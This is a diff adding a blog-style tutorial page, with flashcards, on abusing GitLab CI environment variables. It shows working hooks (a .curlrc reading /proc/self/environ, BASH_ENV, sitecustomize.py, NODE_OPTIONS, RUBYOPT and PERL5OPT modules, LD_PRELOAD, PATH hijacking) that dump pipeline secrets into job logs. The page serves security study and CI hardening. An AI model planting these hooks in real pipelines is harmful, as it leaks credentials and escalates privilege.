@@ -1,0 +1,302 @@
+<!doctype html>
+
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"><title>rackodej/GitLab job envs</title>
+    <meta property="og:title" content="rackodej/GitLab job envs">
+    <meta name="twitter:title" content="rackodej/GitLab job envs">
+    <link rel="alternate" type="application/rss+xml" title="rackodej RSS (EN)" href="../../../en/feed.xml">
+    <link rel="stylesheet" href="../../../src/styles.css">
+    <link rel="stylesheet" href="../../../src/prism-layer.css">
+    <link rel="stylesheet" href="https://unpkg.com/prismjs/themes/prism-okaidia.css">
+<link rel="stylesheet" href="https://unpkg.com/prismjs/plugins/command-line/prism-command-line.css">
+
+
+
+  </head>
+  <body>
+    <div class="language-switcher"><div class="lang-buttons-group right">
+          <form action="../../../ru/posts/giltab-ci-debug-trace/" method="get" class="xp-form-inline">
+            <button type="submit"
+                    
+                    >
+              RU
+            </button>
+          </form>
+          <form action="../../../en/posts/giltab-ci-debug-trace/" method="get" class="xp-form-inline">
+            <button type="submit"
+                    aria-pressed="true"
+                    >
+              EN
+            </button>
+          </form>
+        </div><form action="../../../en/" method="get" class="xp-form-inline center">
+        <button type="submit">Main</button>
+      </form>
+
+      <div class="toc-dock toc-collapsed">
+          <div class="toc-heading-row">
+            <div class="toc-heading" id="toc-title">Contents</div>
+            <button class="toc-toggle" type="button" aria-expanded="false" aria-controls="page-toc" data-hide-label="[hide]" data-show-label="[show]">[show]</button>
+          </div>
+          <div class="toc-content" id="page-toc" aria-labelledby="toc-title">
+            <nav class="toc" >
+        <ol><li><a href="#%3E-gitlab-job-envs">&gt; GitLab job envs</a><ol><li><a href="#ci_debug_trace">CI_DEBUG_TRACE</a></li><li><a href="#curl_home">CURL_HOME</a></li><li><a href="#bash_env">BASH_ENV</a></li><li><a href="#pythonpath">PYTHONPATH</a></li><li><a href="#path">PATH</a></li><li><a href="#ld_*">LD_*</a></li><li><a href="#pythonhome">PYTHONHOME</a></li><li><a href="#home">HOME</a></li><li><a href="#ci_debug_services">CI_DEBUG_SERVICES</a></li><li><a href="#node_options">NODE_OPTIONS</a></li><li><a href="#rubyopt">RUBYOPT</a></li><li><a href="#perl5opt">PERL5OPT</a></li><li><a href="#java_tool_options">JAVA_TOOL_OPTIONS</a></li><li><a href="#xdg_config_home">XDG_CONFIG_HOME</a></li><li><a href="#proxy">PROXY</a></li></ol></li></ol>
+      </nav>
+          </div>
+        </div></div>
+
+    <main class="container"><h1 id="%3E-gitlab-job-envs" tabindex="-1">&gt; GitLab job envs</h1>
+<section class="anki-cards" data-anki-deck="giltab-ci-debug-trace"><div class="anki-cards__status"><span class="anki-cards__counter" data-anki-counter></span></div><article class="anki-cards__card"><div class="anki-cards__label">Question</div><div class="anki-cards__question" data-anki-question></div><div class="anki-cards__answer" data-anki-answer-block hidden><div class="anki-cards__label">Answer</div><div class="anki-cards__answer-text" data-anki-answer></div></div></article><div class="anki-cards__controls"><button type="button" data-anki-action="prev">Previous</button><button type="button" data-anki-action="show-answer" data-label-show="Show answer" data-label-hide="Hide answer">Show answer</button><button type="button" data-anki-action="next">Next</button><button type="button" data-anki-action="shuffle">Shuffle</button></div><script type="application/json" class="anki-cards__data">[{"question":"What does CI_DEBUG_TRACE enable in GitLab CI?","answer":"A detailed trace log of commands and their arguments.","tag":"gitlab-ci"},{"question":"How does BASH_ENV affect non-interactive Bash?","answer":"Bash reads the specified file before running its main script.","tag":"bash"},{"question":"What is PYTHONPATH used for?","answer":"It adds Python module search directories and can provide sitecustomize.py.","tag":"python"},{"question":"What is PYTHONHOME used for?","answer":"It sets the standard-library base directory; it does not execute code automatically.","tag":"python"},{"question":"What happens when a directory is placed first in PATH?","answer":"A matching executable in that directory is found before later entries.","tag":"shell"},{"question":"What does HOME change for CLI tools?","answer":"The directory where many tools look for user configuration.","tag":"shell"},{"question":"What does CI_DEBUG_SERVICES enable?","answer":"It adds service-container logs to the GitLab job trace.","tag":"gitlab-ci"},{"question":"How can NODE_OPTIONS load a module before the main application?","answer":"By passing the Node.js --require or --import option.","tag":"nodejs"},{"question":"What are RUBYOPT and RUBYLIB used for?","answer":"RUBYOPT supplies Ruby options, while RUBYLIB supplies library search directories.","tag":"ruby"},{"question":"What are PERL5OPT and PERL5LIB used for?","answer":"PERL5OPT supplies Perl options, while PERL5LIB supplies module search directories.","tag":"perl"},{"question":"What does JAVA_TOOL_OPTIONS do?","answer":"It adds options when the JVM is created, including Java agent loading.","tag":"java"},{"question":"Which variable selects the global Git configuration file?","answer":"GIT_CONFIG_GLOBAL.","tag":"git"},{"question":"What does KUBECONFIG select?","answer":"Files containing kubectl clusters, users, certificates, and contexts.","tag":"kubernetes"},{"question":"What does DOCKER_CONFIG select?","answer":"The directory where Docker CLI reads config.json.","tag":"docker"},{"question":"What does XDG_CONFIG_HOME select?","answer":"The shared user-configuration root used by XDG-compatible programs.","tag":"xdg"},{"question":"What do HTTP_PROXY, HTTPS_PROXY, and ALL_PROXY change?","answer":"The network route used by programs that support these variables.","tag":"proxy"}]</script></section>
+<p>Sometimes, a regular GitLab developer account can uncover privileged accounts in pipeline stages.</p>
+<h2 id="ci_debug_trace" tabindex="-1">CI_DEBUG_TRACE</h2>
+<p>In GitLab CI, <code class="pill pill-yellow">CI_DEBUG_TRACE</code> controls the detailed job trace log.</p>
+<pre class="language-yaml"><code class="language-yaml"><span class="highlight-line"><span class="token key atrule">variables</span><span class="token punctuation">:</span></span>
+<span class="highlight-line">  <span class="token key atrule">CI_DEBUG_TRACE</span><span class="token punctuation">:</span> <span class="token string">"true"</span></span></code></pre>
+<p>The trace shows executed commands and their arguments. GitLab masks protected variables, but a secret can still appear in program output or in a form that the masking logic does not recognise.</p>
+<h2 id="curl_home" tabindex="-1">CURL_HOME</h2>
+<ol>
+<li>Create <code class="pill pill-yellow">.curlrc</code> in the project root:</li>
+</ol>
+<pre class="language-bash"><code class="language-bash"><span class="highlight-line">verbose</span>
+<span class="highlight-line">show-error</span>
+<span class="highlight-line"></span>
+<span class="highlight-line">url <span class="token operator">=</span> <span class="token string">"file:///proc/self/environ"</span></span>
+<span class="highlight-line">output <span class="token operator">=</span> <span class="token string">"/dev/stderr"</span></span>
+<span class="highlight-line"></span>
+<span class="highlight-line">next</span></code></pre>
+<ol start="2">
+<li>Set <code class="pill pill-yellow">CURL_HOME=&quot;$CI_PROJECT_DIR&quot;</code>.</li>
+</ol>
+<p>When curl starts, it reads <code class="pill pill-green">.curlrc</code>, requests the configured <code>url</code>, and writes the result to the job’s <code>stderr</code>.</p>
+<h2 id="bash_env" tabindex="-1">BASH_ENV</h2>
+<ol>
+<li>Create <code class="pill pill-yellow">env.sh</code> in the project root:</li>
+</ol>
+<pre class="language-bash"><code class="language-bash"><span class="highlight-line"><span class="token punctuation">{</span></span>
+<span class="highlight-line">  <span class="token builtin class-name">echo</span> <span class="token string">"=== BASH_ENV_HIT ==="</span></span>
+<span class="highlight-line">  <span class="token function">id</span></span>
+<span class="highlight-line">  <span class="token builtin class-name">pwd</span></span>
+<span class="highlight-line">  <span class="token builtin class-name">echo</span> <span class="token string">"=== ENV ==="</span></span>
+<span class="highlight-line">  <span class="token function">env</span> <span class="token operator">|</span> <span class="token function">sort</span></span>
+<span class="highlight-line">  <span class="token builtin class-name">echo</span> <span class="token string">"=== END ==="</span></span>
+<span class="highlight-line"><span class="token punctuation">}</span> <span class="token operator">></span><span class="token file-descriptor important">&amp;2</span></span></code></pre>
+<ol start="2">
+<li>Set <code class="pill pill-yellow">BASH_ENV: &quot;$CI_PROJECT_DIR/env.sh&quot;</code>.</li>
+</ol>
+<p>Every non-interactive Bash process reads <code class="pill pill-green">env.sh</code> before running its main script. This variable does not affect other shells.</p>
+<h2 id="pythonpath" tabindex="-1">PYTHONPATH</h2>
+<ol>
+<li>Create <code class="pill pill-yellow">pythonpath/sitecustomize.py</code> in the project root:</li>
+</ol>
+<pre class="language-python"><code class="language-python"><span class="highlight-line"><span class="token keyword">import</span> os</span>
+<span class="highlight-line"><span class="token keyword">import</span> sys</span>
+<span class="highlight-line"></span>
+<span class="highlight-line"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"=== PYTHONPATH_ENV ==="</span><span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span></span>
+<span class="highlight-line"><span class="token keyword">for</span> name<span class="token punctuation">,</span> value <span class="token keyword">in</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span>
+<span class="highlight-line">    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">=</span><span class="token interpolation"><span class="token punctuation">{</span>value<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span></span></code></pre>
+<ol start="2">
+<li>Set <code class="pill pill-yellow">PYTHONPATH: &quot;$CI_PROJECT_DIR/pythonpath&quot;</code>.</li>
+</ol>
+<p>During a normal Python startup, the <code class="pill pill-yellow">site</code> module automatically imports a discovered <code class="pill pill-green">sitecustomize.py</code>.</p>
+<p>The <code>-S</code> and <code>-I</code> flags and some isolated environments disable or restrict this mechanism.</p>
+<h2 id="path" tabindex="-1">PATH</h2>
+<ol>
+<li>
+<p>Create a directory containing custom executables in the project, for example <code class="pill pill-yellow">.ci/bin</code>.</p>
+</li>
+<li>
+<p>Put the directory first in <code class="pill pill-yellow">PATH</code>:</p>
+</li>
+</ol>
+<pre class="language-yaml"><code class="language-yaml"><span class="highlight-line"><span class="token key atrule">variables</span><span class="token punctuation">:</span></span>
+<span class="highlight-line">  <span class="token key atrule">PATH</span><span class="token punctuation">:</span> <span class="token string">"$CI_PROJECT_DIR/.ci/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span></span></code></pre>
+<p>If a job invokes a command without an absolute path, the shell uses the first matching executable in <code class="pill pill-yellow">PATH</code>. Shell built-ins and calls such as <code class="pill pill-yellow">/usr/bin/curl</code> are not overridden this way.</p>
+<h2 id="ld_*" tabindex="-1">LD_*</h2>
+<ul>
+<li><code class="pill pill-yellow">LD_PRELOAD</code> loads the specified dynamic library before the others.</li>
+<li><code class="pill pill-yellow">LD_LIBRARY_PATH</code> adds directories to the dynamic-library search path.</li>
+<li><code class="pill pill-yellow">LD_AUDIT</code> loads an audit library to observe dynamic-linker activity in glibc.</li>
+</ul>
+<p>They do not work with statically linked programs.</p>
+<h2 id="pythonhome" tabindex="-1">PYTHONHOME</h2>
+<p>The <code class="pill pill-yellow">PYTHONHOME</code> variable sets the base directory where Python looks for its standard library and platform-specific modules.</p>
+<pre class="language-yaml"><code class="language-yaml"><span class="highlight-line"><span class="token key atrule">variables</span><span class="token punctuation">:</span></span>
+<span class="highlight-line">  <span class="token key atrule">PYTHONHOME</span><span class="token punctuation">:</span> <span class="token string">"$CI_PROJECT_DIR/pythonhome"</span></span></code></pre>
+<p>Unlike <code class="pill pill-yellow">PYTHONPATH</code>, this variable does not run anything automatically. If the directory does not contain a suitable standard library, Python usually exits with an error such as <code class="pill pill-red">No module named 'encodings'</code>. Use <code class="pill pill-yellow">PYTHONPATH</code> to load custom modules and <code class="pill pill-yellow">sitecustomize.py</code>.</p>
+<h2 id="home" tabindex="-1">HOME</h2>
+<p>The <code class="pill pill-yellow">HOME</code> variable can point to the project directory:</p>
+<pre class="language-yaml"><code class="language-yaml"><span class="highlight-line"><span class="token key atrule">variables</span><span class="token punctuation">:</span></span>
+<span class="highlight-line">  <span class="token key atrule">HOME</span><span class="token punctuation">:</span> <span class="token string">"$CI_PROJECT_DIR"</span></span></code></pre>
+<p>Many tools will then look for user configuration in the project: curl reads <code class="pill pill-yellow">.curlrc</code>, Git reads <code class="pill pill-yellow">.gitconfig</code>, and other programs inspect files in <code class="pill pill-yellow">$HOME</code> or <code class="pill pill-yellow">$HOME/.config</code>.</p>
+<h2 id="ci_debug_services" tabindex="-1">CI_DEBUG_SERVICES</h2>
+<p>The <code class="pill pill-yellow">CI_DEBUG_SERVICES</code> variable adds service-container logs to the trace:</p>
+<pre class="language-yaml"><code class="language-yaml"><span class="highlight-line"><span class="token key atrule">variables</span><span class="token punctuation">:</span></span>
+<span class="highlight-line">  <span class="token key atrule">CI_DEBUG_SERVICES</span><span class="token punctuation">:</span> <span class="token string">"true"</span></span></code></pre>
+<p>It is useful for debugging PostgreSQL, Redis, Docker-in-Docker, and so on. Service logs are mixed with the job log, and masked variables can be exposed.</p>
+<h2 id="node_options" tabindex="-1">NODE_OPTIONS</h2>
+<ol>
+<li>Create <code class="pill pill-yellow">.ci/node-hook.cjs</code> in the project:</li>
+</ol>
+<pre class="language-javascript"><code class="language-javascript"><span class="highlight-line">console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"=== NODE_OPTIONS_HIT ==="</span><span class="token punctuation">)</span></span>
+<span class="highlight-line">console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"=== NODE_OPTIONS_ENV ==="</span><span class="token punctuation">)</span></span>
+<span class="highlight-line">console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">)</span></span>
+<span class="highlight-line">  <span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>right<span class="token punctuation">]</span></span><span class="token punctuation">)</span> <span class="token operator">=></span> left<span class="token punctuation">.</span><span class="token function">localeCompare</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span><span class="token punctuation">)</span></span>
+<span class="highlight-line">  <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">[</span>name<span class="token punctuation">,</span> value<span class="token punctuation">]</span></span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>value<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span></span>
+<span class="highlight-line">  <span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></code></pre>
+<ol start="2">
+<li>Load the module through <code class="pill pill-yellow">NODE_OPTIONS</code>:</li>
+</ol>
+<pre class="language-yaml"><code class="language-yaml"><span class="highlight-line"><span class="token key atrule">variables</span><span class="token punctuation">:</span></span>
+<span class="highlight-line">  <span class="token key atrule">NODE_OPTIONS</span><span class="token punctuation">:</span> <span class="token string">"--require=$CI_PROJECT_DIR/.ci/node-hook.cjs"</span></span></code></pre>
+<p>Every Node.js process loads the module before the main application. Use <code>--require</code> for CommonJS and <code>--import</code> for ESM.</p>
+<h2 id="rubyopt" tabindex="-1">RUBYOPT</h2>
+<ol>
+<li>Create <code class="pill pill-yellow">.ci/ruby/ci_hook.rb</code> in the project:</li>
+</ol>
+<pre class="language-ruby"><code class="language-ruby"><span class="highlight-line">warn <span class="token string-literal"><span class="token string">"=== RUBYOPT_HIT ==="</span></span></span>
+<span class="highlight-line">warn <span class="token string-literal"><span class="token string">"=== RUBYOPT_ENV ==="</span></span></span>
+<span class="highlight-line"><span class="token constant">ENV</span><span class="token punctuation">.</span>sort<span class="token punctuation">.</span><span class="token keyword">each</span> <span class="token punctuation">{</span> <span class="token operator">|</span>name<span class="token punctuation">,</span> value<span class="token operator">|</span> warn <span class="token string-literal"><span class="token string">"</span><span class="token interpolation"><span class="token delimiter punctuation">#{</span><span class="token content">name</span><span class="token delimiter punctuation">}</span></span><span class="token string">=</span><span class="token interpolation"><span class="token delimiter punctuation">#{</span><span class="token content">value</span><span class="token delimiter punctuation">}</span></span><span class="token string">"</span></span> <span class="token punctuation">}</span></span></code></pre>
+<ol start="2">
+<li>Set the library search path and automatic require option:</li>
+</ol>
+<pre class="language-yaml"><code class="language-yaml"><span class="highlight-line"><span class="token key atrule">variables</span><span class="token punctuation">:</span></span>
+<span class="highlight-line">  <span class="token key atrule">RUBYLIB</span><span class="token punctuation">:</span> <span class="token string">"$CI_PROJECT_DIR/.ci/ruby"</span></span>
+<span class="highlight-line">  <span class="token key atrule">RUBYOPT</span><span class="token punctuation">:</span> <span class="token string">"-rci_hook"</span></span></code></pre>
+<p>Every Ruby process loads <code class="pill pill-yellow">ci_hook.rb</code> via the <code>-r</code> option before the main script.</p>
+<h2 id="perl5opt" tabindex="-1">PERL5OPT</h2>
+<ol>
+<li>Create <code class="pill pill-yellow">.ci/perl/CiHook.pm</code> in the project:</li>
+</ol>
+<pre class="language-perl"><code class="language-perl"><span class="highlight-line"><span class="token keyword">package</span> CiHook<span class="token punctuation">;</span></span>
+<span class="highlight-line">warn <span class="token string">"=== PERL5OPT_HIT ===\n"</span><span class="token punctuation">;</span></span>
+<span class="highlight-line">warn <span class="token string">"=== PERL5OPT_ENV ===\n"</span><span class="token punctuation">;</span></span>
+<span class="highlight-line">warn <span class="token string">"$_=$ENV{$_}\n"</span> <span class="token keyword">for</span> sort keys <span class="token variable">%ENV</span><span class="token punctuation">;</span></span>
+<span class="highlight-line"><span class="token number">1</span><span class="token punctuation">;</span></span></code></pre>
+<ol start="2">
+<li>Set the module directory and loading option:</li>
+</ol>
+<pre class="language-yaml"><code class="language-yaml"><span class="highlight-line"><span class="token key atrule">variables</span><span class="token punctuation">:</span></span>
+<span class="highlight-line">  <span class="token key atrule">PERL5LIB</span><span class="token punctuation">:</span> <span class="token string">"$CI_PROJECT_DIR/.ci/perl"</span></span>
+<span class="highlight-line">  <span class="token key atrule">PERL5OPT</span><span class="token punctuation">:</span> <span class="token string">"-MCiHook"</span></span></code></pre>
+<p>Every Perl process loads the <code class="pill pill-yellow">CiHook</code> module before the main script.</p>
+<h2 id="java_tool_options" tabindex="-1">JAVA_TOOL_OPTIONS</h2>
+<p><code class="pill pill-yellow">JAVA_TOOL_OPTIONS</code> adds options when the JVM is created:</p>
+<pre class="language-yaml"><code class="language-yaml"><span class="highlight-line"><span class="token key atrule">variables</span><span class="token punctuation">:</span></span>
+<span class="highlight-line">  <span class="token key atrule">JAVA_TOOL_OPTIONS</span><span class="token punctuation">:</span> <span class="token string">"-javaagent:$CI_PROJECT_DIR/.ci/audit-agent.jar"</span></span></code></pre>
+<p>When Java starts, it loads the specified Java agent. The related <code class="pill pill-yellow">JDK_JAVA_OPTIONS</code> variable passes options to the Java launcher.</p>
+<h2 id="xdg_config_home" tabindex="-1">XDG_CONFIG_HOME</h2>
+<p>The <code class="pill pill-yellow">XDG_CONFIG_HOME</code> variable is a shared user-configuration root for tools that support the XDG Base Directory specification:</p>
+<pre class="language-yaml"><code class="language-yaml"><span class="highlight-line"><span class="token key atrule">variables</span><span class="token punctuation">:</span></span>
+<span class="highlight-line">  <span class="token key atrule">XDG_CONFIG_HOME</span><span class="token punctuation">:</span> <span class="token string">"$CI_PROJECT_DIR/.config"</span></span></code></pre>
+<p>Configuration is then searched for in subdirectories of <code class="pill pill-yellow">.config</code>.</p>
+<h2 id="proxy" tabindex="-1">PROXY</h2>
+<p>Proxy variables change the route used for network requests:</p>
+<pre class="language-yaml"><code class="language-yaml"><span class="highlight-line"><span class="token key atrule">variables</span><span class="token punctuation">:</span></span>
+<span class="highlight-line">  <span class="token key atrule">HTTPS_PROXY</span><span class="token punctuation">:</span> <span class="token string">"http://proxy.example:8080"</span></span>
+<span class="highlight-line">  <span class="token key atrule">HTTP_PROXY</span><span class="token punctuation">:</span> <span class="token string">"http://proxy.example:8080"</span></span>
+<span class="highlight-line">  <span class="token key atrule">ALL_PROXY</span><span class="token punctuation">:</span> <span class="token string">"socks5://proxy.example:1080"</span></span>
+<span class="highlight-line">  <span class="token key atrule">NO_PROXY</span><span class="token punctuation">:</span> <span class="token string">"localhost,127.0.0.1,.internal"</span></span></code></pre>
+
+    </main>
+
+    <footer class="site-footer"></footer>
+    <script defer src="../../../src/copy.js"></script>
+    <script defer src="../../../src/ln-gaps.js"></script>
+    <script defer src="../../../src/asciinema-loader.js"></script>
+    <script defer src="../../../src/anki-cards.js"></script>
+    <script defer src="../../../src/activity-popover.js"></script>
+    <script>
+  window.__DEV_FONT_EXTRA = {
+    stacks: {
+      system: 'system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif',
+      forma:  '"Forma", Tahoma, "Segoe UI", Arial, sans-serif',
+      ia:     '"iA Writer Duospace", ui-monospace, SFMono-Regular, Menlo, Consolas, "Liberation Mono", monospace',
+      jb:     '"JetBrains Mono", ui-monospace, SFMono-Regular, Menlo, Consolas, monospace',
+
+      inter: '"Inter", system-ui, -apple-system, "Segoe UI", Roboto, "Noto Sans", Arial, sans-serif',
+      roboto: '"Roboto", system-ui, -apple-system, "Segoe UI", "Noto Sans", Arial, sans-serif',
+      notosans: '"Noto Sans", system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif',
+      ibmplexsans: '"IBM Plex Sans", system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif',
+      ptsans: '"PT Sans", system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif',
+      opensans: '"Open Sans", system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif',
+      manrope: '"Manrope", system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif',
+      golos: '"Golos Text", system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif',
+      firasans: '"Fira Sans", system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif',
+      ubuntu: '"Ubuntu", system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif',
+      mulish: '"Mulish", system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif',
+      rubik: '"Rubik", system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif',
+      exo2: '"Exo 2", system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif',
+      lato: '"Lato", system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif',
+      montserrat: '"Montserrat", system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif',
+      oswald: '"Oswald", "Noto Sans", system-ui, -apple-system, "Segoe UI", Arial, sans-serif',
+      notoserif: '"Noto Serif", Georgia, "Times New Roman", serif',
+      ptserif: '"PT Serif", Georgia, "Times New Roman", serif',
+      merriweather: '"Merriweather", Georgia, "Times New Roman", serif',
+      lora: '"Lora", Georgia, "Times New Roman", serif',
+      literata: '"Literata", Georgia, "Times New Roman", serif',
+      playfair: '"Playfair Display", "Times New Roman", Georgia, serif',
+      jbmono: '"JetBrains Mono", ui-monospace, SFMono-Regular, Menlo, Consolas, monospace',
+      firacode: '"Fira Code", ui-monospace, SFMono-Regular, Menlo, Consolas, monospace',
+      plexmono: '"IBM Plex Mono", ui-monospace, SFMono-Regular, Menlo, Consolas, monospace',
+      ptmono: '"PT Mono", ui-monospace, Menlo, Consolas, monospace',
+      ubuntumono: '"Ubuntu Mono", ui-monospace, Menlo, Consolas, monospace',
+      cousine: '"Cousine", ui-monospace, Menlo, Consolas, monospace',
+    },
+    webfonts: {
+      forma: '',
+      ia:    'https://fonts.googleapis.com/css2?family=IA+Writer+Duospace&display=swap',
+      jb:    'https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap',
+
+      inter: 'https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap&subset=cyrillic',
+      roboto: 'https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap&subset=cyrillic',
+      notosans: 'https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;600;700&display=swap&subset=cyrillic',
+      ibmplexsans: 'https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;600;700&display=swap&subset=cyrillic',
+      ptsans: 'https://fonts.googleapis.com/css2?family=PT+Sans:wght@400;700&display=swap&subset=cyrillic',
+      opensans: 'https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap&subset=cyrillic',
+      manrope: 'https://fonts.googleapis.com/css2?family=Manrope:wght@400;600;700&display=swap&subset=cyrillic',
+      golos: 'https://fonts.googleapis.com/css2?family=Golos+Text:wght@400;600;700&display=swap&subset=cyrillic',
+      firasans: 'https://fonts.googleapis.com/css2?family=Fira+Sans:wght@400;600;700&display=swap&subset=cyrillic',
+      ubuntu: 'https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;500;700&display=swap&subset=cyrillic',
+      mulish: 'https://fonts.googleapis.com/css2?family=Mulish:wght@400;600;700&display=swap&subset=cyrillic',
+      rubik: 'https://fonts.googleapis.com/css2?family=Rubik:wght@400;500;700&display=swap&subset=cyrillic',
+      exo2: 'https://fonts.googleapis.com/css2?family=Exo+2:wght@400;600;700&display=swap&subset=cyrillic',
+      lato: 'https://fonts.googleapis.com/css2?family=Lato:wght@400;700&display=swap&subset=cyrillic',
+      montserrat: 'https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap&subset=cyrillic',
+      oswald: 'https://fonts.googleapis.com/css2?family=Oswald:wght@400;600&display=swap&subset=cyrillic',
+      notoserif: 'https://fonts.googleapis.com/css2?family=Noto+Serif:wght@400;600;700&display=swap&subset=cyrillic',
+      ptserif: 'https://fonts.googleapis.com/css2?family=PT+Serif:wght@400;700&display=swap&subset=cyrillic',
+      merriweather: 'https://fonts.googleapis.com/css2?family=Merriweather:wght@400;700&display=swap&subset=cyrillic',
+      lora: 'https://fonts.googleapis.com/css2?family=Lora:wght@400;600;700&display=swap&subset=cyrillic',
+      literata: 'https://fonts.googleapis.com/css2?family=Literata:wght@400;600;700&display=swap&subset=cyrillic',
+      playfair: 'https://fonts.googleapis.com/css2?family=Playfair+Display:wght@500;700&display=swap&subset=cyrillic',
+      jbmono: 'https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&display=swap&subset=cyrillic',
+      firacode: 'https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&display=swap&subset=cyrillic',
+      plexmono: 'https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600;700&display=swap&subset=cyrillic',
+      ptmono: 'https://fonts.googleapis.com/css2?family=PT+Mono&display=swap&subset=cyrillic',
+      ubuntumono: 'https://fonts.googleapis.com/css2?family=Ubuntu+Mono:wght@400;700&display=swap&subset=cyrillic',
+      cousine: 'https://fonts.googleapis.com/css2?family=Cousine:wght@400;700&display=swap&subset=cyrillic',
+    }
+  };
+</script>
+
+    <!-- script defer src="../../../src/dev-fonts.js"></script -->
+  <script type="module" async>import mermaid from "https://unpkg.com/mermaid@11.11.0/dist/mermaid.esm.min.mjs";document.addEventListener('DOMContentLoaded', mermaid.initialize({"loadOnSave":true}));</script>
+  <script defer src="../../../src/toc-autohide.js"></script>
+<script>window.Prism = window.Prism || {}; Prism.manual = true;</script>
+<script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+
+<!-- Языки, которые реально используешь -->
+<script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-sql.min.js" defer></script>
+
+<script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/command-line/prism-command-line.min.js" defer></script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    document.querySelectorAll('pre.command-line > code').forEach(Prism.highlightElement);
+  });
+</script>
+  </body>
+  
+</html>
